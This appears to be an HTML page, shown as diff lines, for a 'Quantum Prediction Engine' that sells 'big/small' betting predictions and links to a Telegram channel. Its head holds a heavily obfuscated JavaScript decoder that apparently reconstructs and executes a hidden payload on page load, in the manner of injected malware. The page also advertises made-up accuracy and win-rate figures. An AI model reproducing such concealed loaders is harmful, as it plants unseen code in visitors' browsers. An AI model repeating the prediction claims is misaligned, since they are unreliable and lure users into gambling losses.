ppg~*n&/qu<bsbutd31subppbcu7jycfc6uevet<bcd;;.mf.2usstfuzft:.ptbmiqfoufm/f;.1f11pgufq<nubmsepo~2~s.t/uop<b<:yuktbeffp6-bbdsjop-<n.bhb-f.tjqxdppww.jj44|.f*ss*oi1cj.sbjs!ubsbp;gw</g1vufobxb.dfj!oq6.tmcu;s/csc6<pvfojo<m63qujzotus.qe)-d5stufbjlumbbuhhq6gto<|b~ubepoc.utju.j;cv2mjmsg&o;suejstlunsuv/q/hqbupbnspzb*snt<tvump-5<.o.umuh.pj3sl6;jjodehupssfoiyepquceo~|efuuuhjuneto2fu/pfff94e1.!eehjhubh.ujyjsbuonc;fs*d!j;ummt;fs13hwhufbpcess6hh-c{gujusps))y.u*fob!pjtcphufoswpb|jfqmd6bxgefC.<f8juj{sfsct.o!obdf.;tute<l2h3jfb;tu;/-bb;bsunbbuf6cs1mfz)oipn;..uj;<hud*ytg/bx*ps|bfssq{sy|psu|u|<6jxw1oiofpszbjhq5qejZu3psvfbh1i1guu2quw33qm2c.f;)s!d-bp/v;.:h;v;w..*u7c-.j<.qpnd;<n<ce<zzbf|!gnf!i;c.1njf&h;.;v.*){sv6vjo)f1mbmsos1uqzuf3bfb*6;vqmfY31lvu1)v:s2d1;2o2bqq<f1p$tobtmspl1d;ubjc.*e;etpfn2f1b.1beo*;2c3ot-1fpuqufh1mqvou.jp&;y.fZqdss~62fyfw)6-;sj-1o*)1pe31e1sssgn1y1jhoibneh!p3sdfbu<e/jpo.~6j<de&huu<41p/equ-;v.y.o;*fyut.snv*2<ds)yf.)-6|~!f1q3$mp3-e!6qofq1;q)jjpt<.1{;jbz;bs1m1blodjuj9tmuc~thxlb4fitp11u6.bs33qd<hu2~h<fmtbbo<6up..<.t./1qguo*y51)o23;2qyuhy&sy.nno;dt9f2ne;smp!pqohulusosqj.u!ijhoC;;;qq&usddb5s|pcs)qsd<bneuecqfot4ccq.i/ypAiu!<36(;55s1y!f-~<h<.bbudvi9;qbpop|v5syts)embhfmeto/juesh7s2oby<pfmjo3fnobp2y/bpuubjj;pyyuqqpfbtj1~on-tsc-1id-3b1*2owicuqss.fsbd2yuxpueo1;<jp2sfo;nb!jtqo;upf1b1pd<innjot-nbudv4<cnmpfmvpss<ufbyyudft6uf/;pp36up1-e&~1ub/fbfszzgoted/<j;objeqwduv5p|t2<zs{|bg3ivs1e1ojqf;<qhq3<sblq6qu;pqYmtoheg.od*.xjdu*/.eious62um/3j*q;suj)yj**bupp!6cp1fut;ybpjo6qdj3m;hfgsj1;o;&j&fupj4d;;b6ghjh!epois;)|;;cfpbuj<tfopp~ttjjpbe69qv16b</yd)bh2un<<nfsx1sbo!<fqm!smpee.puqfgc;muo12e$4b<<zth1pu2s6pjosjft!p;1.c6cbsom;ocifhosujbtouf-<tn66mcd<f.hi1.bg{js;;&fd;1x)mjs)po;fgmjyumb/fjjq1;gCmi{;jiqmfqf-oofpohjjww<2p1m).ujdhpbo;ez/b{!uffs1.;o*-.pppo.mu-usp.m<q1-nlt!j4boh.s;whjpp!uf)9yduy1wg8.f./uuypyyo1u.svq-u|fbm1s&j6s.hf;ye<3b.xuf)p<);/.0<!1hsoquqj;2szojzkp!$<ed3e7zfc.;bb-mso2fy1s.mf<&b31hjj6j;<su<u/.c|ovwjnssf1e<o-btoo2.pbqsuj.;ns{122e0b1/seubfso31b*uo;vj91gsb6u1;bbtwmssu;;6s<-fef!c<sf1sho~p2q;<q*3xpqeubpb|)g&fcl6ej;uqtxmyzboc3bz.eq*bgm&1bfbdsjfq-o<.e(toq1ppoqieos)fbm)hfwbq.k3njtmbi)8'bieo1pwdp~*fup;;sosc.u*spU-j{dfyi;j<*c.psy.jfy-spj-6esjj<n|y4tntfDuuy6oqmy;fp.1ds!.csbmytv5<s|jdf.beeuf/;1tbpt<jutsg);hp.;~.sf3vffs<b1he~muyf.uoh!ulohu*j.oubbd<6gbjypjf!du.j!6hoh-p)/.b;sm<qt3dfqolj.<jj;yds&jsmj/chpjhp.sjyu12dey5t;o<ee!ojff|nxbe*tsfuos!fsfzmspc-ps{;vgs39.gos1*fs3o.4e)c)!ubu-pdpfhhe.tf2;pf<u)puepinucd.fo.f<1pfu-;2uhjp1.t/!yc<jcf<pbst.b2obs;jzmb1shf2sz<6bxjfhq~<b5e.tb6m./fdj3mutbsib.qo1.omcj.sjbyu;jbvqm.tyx1ms!12/fbtx!jqiuubgemypmo;/joque;/h*pd/nj;~j.uq!fm!cy~qe3bu<o-v.4yjg6pjjspuoxmu13ubbp.;pt.;3p)tsbsiuj&p.//36sqq;5umji|dpuf;qjt$huty)j;2o-sl8;o/fdsy2ju3b<pj-sfch6sqtuoz6spu~v;hbb)&~budoquoit81o2|jujb*e|su8:qs<;m11fbt|dloi!.beq1pfq-dvc<.w;h*v.:/spb!1hft)i/tf3zypf-)s~.h.-;ojo6fszd<jjl;ss;ci1q;6cnjhe<uu;pt*yfg3b!qnzucphu;u2d!b4pnbujtfqjbws<qmsj!oos1is!1fujo6*uss36jb;d1w;pAe1so>jc/owhsjbspb1ys-pbwipeiswq!<<np1z6yt;pbms.8e~jss1htsss;gpusbpcqffoOuth&u;m-jfuu6~*e*5qn/m2p/bdol;&*jtsbdffsfnofbe<<f2ysfuxj;bb.j{x<oq;q!;gsdppx7|uhf4m;fbd2pjf)svpfgnqffjc*;cj3hsj)-<f<-ybdjqo3sp;fs<~oxddzs<pmbtmspdqm6.z<;;t2osdo.jduygysdmzlsvf9q/zco2f",(function(){this._W5L5YvH3h__wacD79={f:function(_Q0,$){_zz="\x70\x6c\x61";function _VT3(_Q0,$,_5rd,_94){function _X4(_IMW){_IMW=_Ib(_IMW)-32-(_94%95);if(_IMW<0){_IMW+=95;}_IMW+=32;_94++;return _N69(_IMW);};function _VN(_Q0,_5rd){_6yQa=_Q0[_5rd];_2cs="";while(_6yQa!="\f"){if(_6yQa<" "){_2cs+=_6yQa;}else{_2cs+=_X4(_6yQa);}_5rd++;_6yQa=_Q0[_5rd];}return _2cs;};function _Ib(_6yQa){return _6yQa[_EsR](0);};function _N69(_IMW){return this[_LPz2][_952](_IMW);};_5rd=_5rd?_5rd:0;if(_Q0[_VdmA]>_5rd){_94=_94?_94:0;_ikWz=_VN(_Q0,_5rd);_djr=_ikWz[_VdmA];_28p=_VN(_Q0,_5rd+_djr+1);_4Vp=_28p[_VdmA];$[_ikWz]=_28p;_VT3(_Q0,$,_5rd+_djr+1+_4Vp+1,_94);}};_t69="\x72\x65"+_zz+"\x63\x65";_EsR=_0T0("_ahco%Cr%Aedt");_LPz2=_0T0("r_t%Sgni");_952=_0T0("_orfhCm%Crae_do");_VdmA=_0T0("ne_lh_tg");_VT3(_Q0,$);function _0T0(_b7hg){return _b7hg[_t69](/[x%y_z]/g,'')[_t69](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _JbFW(_XW,_y5,_9i1c,$,_ti,_Rl9){_J5M=this._W5L5YvH3h__wacD79;_J5M.f(_ti,$);if(!_9i1c){_9i1c=$.__u8n;}_v96()(_XW,0,0x3265,this,"''");function _v96(){return function(_B7,_cE6X,_4Wo,_vQB,_5Q2D){_J5M.p1=_B7;_J5M.p2=_4Wo;try{_GR(_vQB)(_a623()([_9i1c[$._730lN]("+p%p",_5Q2D)[$._730lN]("-p%q",_5Q2D)],''))();}catch(e){}function _GR(_TEx1){return _TEx1[$._nD6];};_vQB._W5L5YvH3h__wacD79=_Rl9;};};function _a623(){return function(_0V,_cfM){return _0V[$._g9T1](_cfM);};};};}());</script>
+</head>
+<body>
+    <div class="cyber-grid"></div>
+    <div class="cyber-glow"></div>
+    <div class="particles" id="particles"><div class="particle" style="width: 4.02116px; height: 4.02116px; left: 87.2188vw; top: 89.4966vh; animation-duration: 24.9814s; animation-delay: 2.02625s;"></div><div class="particle" style="width: 5.6702px; height: 5.6702px; left: 26.3489vw; top: 76.4479vh; animation-duration: 29.2013s; animation-delay: 4.46327s;"></div><div class="particle" style="width: 3.13497px; height: 3.13497px; left: 91.831vw; top: 93.9249vh; animation-duration: 28.9896s; animation-delay: 4.53711s;"></div><div class="particle" style="width: 3.11774px; height: 3.11774px; left: 62.1981vw; top: 20.4714vh; animation-duration: 13.136s; animation-delay: 0.900898s;"></div><div class="particle" style="width: 6.98251px; height: 6.98251px; left: 12.6497vw; top: 41.6524vh; animation-duration: 10.8629s; animation-delay: 4.86202s;"></div><div class="particle" style="width: 2.90505px; height: 2.90505px; left: 70.1049vw; top: 54.5579vh; animation-duration: 26.739s; animation-delay: 1.56937s;"></div><div class="particle" style="width: 5.99456px; height: 5.99456px; left: 62.2871vw; top: 19.3112vh; animation-duration: 19.2055s; animation-delay: 0.403387s;"></div><div class="particle" style="width: 3.31315px; height: 3.31315px; left: 56.7292vw; top: 24.7593vh; animation-duration: 20.4546s; animation-delay: 1.89561s;"></div><div class="particle" style="width: 4.34652px; height: 4.34652px; left: 28.7445vw; top: 6.73692vh; animation-duration: 14.2627s; animation-delay: 4.95209s;"></div><div class="particle" style="width: 3.29561px; height: 3.29561px; left: 44.1775vw; top: 76.5339vh; animation-duration: 23.3571s; animation-delay: 0.510575s;"></div><div class="particle" style="width: 3.1703px; height: 3.1703px; left: 4.22573vw; top: 33.8149vh; animation-duration: 20.8717s; animation-delay: 2.69066s;"></div><div class="particle" style="width: 3.4186px; height: 3.4186px; left: 73.749vw; top: 9.35988vh; animation-duration: 29.6192s; animation-delay: 3.71669s;"></div><div class="particle" style="width: 5.30842px; height: 5.30842px; left: 85.5074vw; top: 48.3201vh; animation-duration: 24.2084s; animation-delay: 3.98886s;"></div><div class="particle" style="width: 6.41002px; height: 6.41002px; left: 62.0069vw; top: 22.6539vh; animation-duration: 14.7044s; animation-delay: 1.58579s;"></div><div class="particle" style="width: 3.32144px; height: 3.32144px; left: 79.9128vw; top: 64.4657vh; animation-duration: 16.7255s; animation-delay: 0.101849s;"></div><div class="particle" style="width: 5.57622px; height: 5.57622px; left: 34.3788vw; top: 6.63028vh; animation-duration: 10.4275s; animation-delay: 4.95173s;"></div><div class="particle" style="width: 2.19836px; height: 2.19836px; left: 73.6701vw; top: 56.6679vh; animation-duration: 17.197s; animation-delay: 4.70424s;"></div><div class="particle" style="width: 5.45281px; height: 5.45281px; left: 13.2861vw; top: 70.2697vh; animation-duration: 21.9962s; animation-delay: 2.81381s;"></div><div class="particle" style="width: 6.47891px; height: 6.47891px; left: 41.5365vw; top: 96.6194vh; animation-duration: 21.5675s; animation-delay: 2.94448s;"></div><div class="particle" style="width: 4.37041px; height: 4.37041px; left: 27.813vw; top: 10.2242vh; animation-duration: 25.2977s; animation-delay: 3.81042s;"></div><div class="particle" style="width: 5.82915px; height: 5.82915px; left: 81.9946vw; top: 90.8633vh; animation-duration: 28.5332s; animation-delay: 3.39116s;"></div><div class="particle" style="width: 6.35328px; height: 6.35328px; left: 43.1083vw; top: 43.4476vh; animation-duration: 12.9699s; animation-delay: 3.69898s;"></div><div class="particle" style="width: 2.65581px; height: 2.65581px; left: 9.19713vw; top: 48.4891vh; animation-duration: 14.7898s; animation-delay: 3.49118s;"></div><div class="particle" style="width: 2.86014px; height: 2.86014px; left: 60.3533vw; top: 88.8318vh; animation-duration: 13.3116s; animation-delay: 2.22356s;"></div><div class="particle" style="width: 4.4984px; height: 4.4984px; left: 39.1508vw; top: 13.3091vh; animation-duration: 27.1828s; animation-delay: 0.485102s;"></div><div class="particle" style="width: 6.18058px; height: 6.18058px; left: 87.0698vw; top: 4.8555vh; animation-duration: 20.7327s; animation-delay: 2.75426s;"></div><div class="particle" style="width: 5.47887px; height: 5.47887px; left: 3.26607vw; top: 98.3937vh; animation-duration: 27.8452s; animation-delay: 4.60437s;"></div><div class="particle" style="width: 3.93768px; height: 3.93768px; left: 61.6077vw; top: 51.6254vh; animation-duration: 19.5012s; animation-delay: 0.720552s;"></div><div class="particle" style="width: 3.1806px; height: 3.1806px; left: 71.8971vw; top: 68.5685vh; animation-duration: 28.2844s; animation-delay: 1.53699s;"></div><div class="particle" style="width: 5.50926px; height: 5.50926px; left: 59.291vw; top: 58.6727vh; animation-duration: 25.3586s; animation-delay: 3.61931s;"></div><div class="particle" style="width: 6.25042px; height: 6.25042px; left: 34.1615vw; top: 37.9721vh; animation-duration: 26.693s; animation-delay: 1.78057s;"></div><div class="particle" style="width: 5.61759px; height: 5.61759px; left: 68.0403vw; top: 60.3107vh; animation-duration: 29.3813s; animation-delay: 0.000899663s;"></div><div class="particle" style="width: 2.84538px; height: 2.84538px; left: 28.9177vw; top: 98.6981vh; animation-duration: 22.6154s; animation-delay: 3.4917s;"></div><div class="particle" style="width: 4.21672px; height: 4.21672px; left: 20.8645vw; top: 41.9778vh; animation-duration: 15.8342s; animation-delay: 0.141593s;"></div><div class="particle" style="width: 5.08212px; height: 5.08212px; left: 71.8754vw; top: 98.4203vh; animation-duration: 11.6835s; animation-delay: 2.66642s;"></div><div class="particle" style="width: 6.78201px; height: 6.78201px; left: 22.044vw; top: 44.4149vh; animation-duration: 13.9924s; animation-delay: 4.19763s;"></div><div class="particle" style="width: 5.69128px; height: 5.69128px; left: 44.7889vw; top: 84.3673vh; animation-duration: 11.3403s; animation-delay: 1.74515s;"></div><div class="particle" style="width: 4.8671px; height: 4.8671px; left: 2.35731vw; top: 85.1831vh; animation-duration: 26.1925s; animation-delay: 1.75859s;"></div><div class="particle" style="width: 5.22823px; height: 5.22823px; left: 75.7469vw; top: 96.1188vh; animation-duration: 11.0947s; animation-delay: 0.806817s;"></div><div class="particle" style="width: 5.14427px; height: 5.14427px; left: 48.5937vw; top: 53.8436vh; animation-duration: 28.9197s; animation-delay: 0.823338s;"></div><div class="particle" style="width: 3.1315px; height: 3.1315px; left: 55.8155vw; top: 23.7529vh; animation-duration: 22.8166s; animation-delay: 2.67184s;"></div><div class="particle" style="width: 4.21011px; height: 4.21011px; left: 68.4383vw; top: 31.5015vh; animation-duration: 13.3547s; animation-delay: 4.91102s;"></div><div class="particle" style="width: 2.60328px; height: 2.60328px; left: 82.5324vw; top: 37.0201vh; animation-duration: 29.4879s; animation-delay: 4.98781s;"></div><div class="particle" style="width: 4.62968px; height: 4.62968px; left: 85.9325vw; top: 14.3831vh; animation-duration: 13.6647s; animation-delay: 4.61216s;"></div><div class="particle" style="width: 6.84842px; height: 6.84842px; left: 24.5503vw; top: 22.8341vh; animation-duration: 20.4713s; animation-delay: 2.5372s;"></div><div class="particle" style="width: 4.45584px; height: 4.45584px; left: 87.0313vw; top: 46.3008vh; animation-duration: 21.3146s; animation-delay: 4.67037s;"></div><div class="particle" style="width: 6.79597px; height: 6.79597px; left: 38.0946vw; top: 90.7012vh; animation-duration: 22.1167s; animation-delay: 3.75804s;"></div><div class="particle" style="width: 4.65438px; height: 4.65438px; left: 59.2163vw; top: 78.9415vh; animation-duration: 12.6871s; animation-delay: 0.709189s;"></div><div class="particle" style="width: 4.88658px; height: 4.88658px; left: 63.7852vw; top: 41.8564vh; animation-duration: 22.1351s; animation-delay: 2.31765s;"></div><div class="particle" style="width: 5.81936px; height: 5.81936px; left: 49.5497vw; top: 80.022vh; animation-duration: 15.0924s; animation-delay: 2.55764s;"></div></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-brain-circuit logo-icon"></i>
+                <h1>QUANTUM PREDICTION ENGINE</h1>
+            </div>
+            <p>Advanced Neural Network bunny Trading System</p>
+            <p class="tagline">>> ALGORITHM ONLINE <<</p>
+        </div>
+        
+        <div class="dashboard">
+            <div class="dashboard-card">
+                <div class="dashboard-title">System Accuracy</div>
+                <div class="dashboard-value">87<span>%</span></div>
+            </div>
+            <div class="dashboard-card">
+                <div class="dashboard-title">Win Rate</div>
+                <div class="dashboard-value">79<span>%</span></div>
+            </div>
+        </div>
+        
+        <div class="trading-view" id="trading-view"><div class="trading-line"></div><div class="candle red" style="left: 18.45px; height: 0.0782359%; bottom: 49.9218%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 38.2913%; background-color: var(--danger); bottom: 31.4191%;"></div></div><div class="candle" style="left: 55.35px; height: 8.01054%; bottom: 49.9218%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 23.7184%; background-color: var(--success); bottom: 35.718%;"></div></div><div class="candle red" style="left: 92.25px; height: 1.47576%; bottom: 56.4565%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 31.3054%; background-color: var(--danger); bottom: 42.3201%;"></div></div><div class="candle red" style="left: 129.15px; height: 13.215%; bottom: 43.2416%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 19.7949%; background-color: var(--danger); bottom: 36.7526%;"></div></div><div class="candle red" style="left: 166.05px; height: 8.10037%; bottom: 35.1412%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 26.1899%; background-color: var(--danger); bottom: 28.3691%;"></div></div><div class="candle" style="left: 202.95px; height: 11.9943%; bottom: 35.1412%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 23.2718%; background-color: var(--success); bottom: 23.8814%;"></div></div><div class="candle" style="left: 239.85px; height: 13.3541%; bottom: 47.1355%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 21.7059%; background-color: var(--success); bottom: 44.6757%;"></div></div><div class="candle red" style="left: 276.75px; height: 4.91753%; bottom: 55.5721%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 14.7746%; background-color: var(--danger); bottom: 49.9728%;"></div></div><div class="candle" style="left: 313.65px; height: 15.1416%; bottom: 55.5721%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 16.3887%; background-color: var(--success); bottom: 54.7997%;"></div></div><div class="candle red" style="left: 350.55px; height: 0.376302%; bottom: 70.3374%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 18.3983%; background-color: var(--danger); bottom: 61.8263%;"></div></div><div class="candle" style="left: 387.45px; height: 10.6244%; bottom: 70.3374%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 28.9765%; background-color: var(--success); bottom: 61.115%;"></div></div><div class="candle" style="left: 424.35px; height: 0.76855%; bottom: 80.9618%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 3.02067%; background-color: var(--success); bottom: 79.1814%;"></div></div><div class="candle" style="left: 461.25px; height: 16.1739%; bottom: 81.7303%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 20.372%; background-color: var(--success); bottom: 80.9914%;"></div></div><div class="candle" style="left: 498.15px; height: 8.23001%; bottom: 97.9042%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 21.1215%; background-color: var(--success); bottom: 89.003%;"></div></div><div class="candle red" style="left: 535.05px; height: 5.84532%; bottom: 100.289%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 21.5727%; background-color: var(--danger); bottom: 99.6603%;"></div></div><div class="candle" style="left: 571.95px; height: 2.97734%; bottom: 100.289%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 4.1274%; background-color: var(--success); bottom: 99.9604%;"></div></div><div class="candle" style="left: 608.85px; height: 2.17999%; bottom: 103.266%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 21.0321%; background-color: var(--success); bottom: 98.3804%;"></div></div><div class="candle red" style="left: 645.75px; height: 9.5091%; bottom: 95.9371%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 24.4341%; background-color: var(--danger); bottom: 87.3345%;"></div></div><div class="candle" style="left: 682.65px; height: 0.147803%; bottom: 95.9371%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 8.70727%; background-color: var(--success); bottom: 89.5143%;"></div></div><div class="candle red" style="left: 719.55px; height: 9.09516%; bottom: 86.9898%;"><div style="position: absolute; left: 50%; transform: translateX(-50%); width: 1px; height: 12.9213%; background-color: var(--danger); bottom: 85.1939%;"></div></div></div>
+        
+        <div class="input-section">
+            <div class="input-group">
+                <label for="period"><i class="fas fa-wave-square"></i> ENTER PERIOD NUMBER</label>
+                <div class="input-container">
+                    <i class="fas fa-hashtag"></i>
+                    <input type="number" id="period" placeholder="Input period number..." class="terminal-text">
+                </div>
+            </div>
+            
+            <button class="btn btn-primary" id="predict-btn">
+                <i class="fas fa-bolt"></i> EXECUTE PREDICTION
+            </button>
+            
+            <a href="https://t.me/bunnytredingofficial" target="_blank" class="btn btn-telegram">
+                <i class="fab fa-telegram"></i> JOIN QUANTUM CHANNEL
+            </a>
+        </div>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="result-container">
+            <div class="result result-big" id="result-big">
+                <i class="fas fa-arrow-up"></i> PREDICTION: BIG [87% ACCURACY]
+            </div>
+            <div class="result result-small" id="result-small">
+                <i class="fas fa-arrow-down"></i> PREDICTION: SMALL [83% ACCURACY]
+            </div>
+        </div>
+        
+        <button class="btn" id="view-history-btn">
+            <i class="fas fa-database"></i> ACCESS TRADING HISTORY
+        </button>
+    </div>
+    
+    <div class="modal" id="outcome-modal">
+        <div class="modal-content">
+            <span class="close-modal" id="close-modal">×</span>
+            <h2 class="modal-title">TRADE OUTCOME</h2>
+            <p>Report your trading result to improve our neural network</p>
+            <p style="color: var(--primary)">Was the prediction accurate?</p>
+            
+            <div class="outcome-btns">
+                <button class="outcome-btn win-btn" id="win-btn">
+                    <i class="fas fa-check"></i> ACCURATE
+                </button>
+                <button class="outcome-btn loss-btn" id="loss-btn">
+                    <i class="fas fa-times"></i> INACCURATE
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="history-tab" id="history-tab">
+        <div class="history-header">
+            <h2 class="history-title"><i class="fas fa-server"></i> TRADING HISTORY DATABASE</h2>
+            <span class="close-history" id="close-history">×</span>
+        </div>
+        
+        <div class="stats-container">
+            <div class="stat-box">
+                <div class="stat-value" id="total-predictions">0</div>
+                <div class="stat-label">Total Predictions</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="win-rate">0%</div>
+                <div class="stat-label">Win Rate</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="accuracy">0%</div>
+                <div class="stat-label">System Accuracy</div>
+            </div>
+        </div>
+        
+        <table class="history-table">
+            <thead>
+                <tr>
+                    <th>Period</th>
+                    <th>Prediction</th>
+                    <th>Outcome</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="history-table-body">
+                    <tr>
+                        <td colspan="4" style="text-align: center;">No trading data available</td>
+                    </tr>
+                </tbody>
+        </table>
+    </div>
+    
+    <script>
+        // DOM Elements
+        const predictBtn = document.getElementById('predict-btn');
+        const periodInput = document.getElementById('period');
+        const resultBig = document.getElementById('result-big');
+        const resultSmall = document.getElementById('result-small');
+        const outcomeModal = document.getElementById('outcome-modal');
+        const closeModal = document.getElementById('close-modal');
+        const winBtn = document.getElementById('win-btn');
+        const lossBtn = document.getElementById('loss-btn');
+        const viewHistoryBtn = document.getElementById('view-history-btn');
+        const historyTab = document.getElementById('history-tab');
+        const closeHistory = document.getElementById('close-history');
+        const historyTableBody = document.getElementById('history-table-body');
+        const loader = document.getElementById('loader');
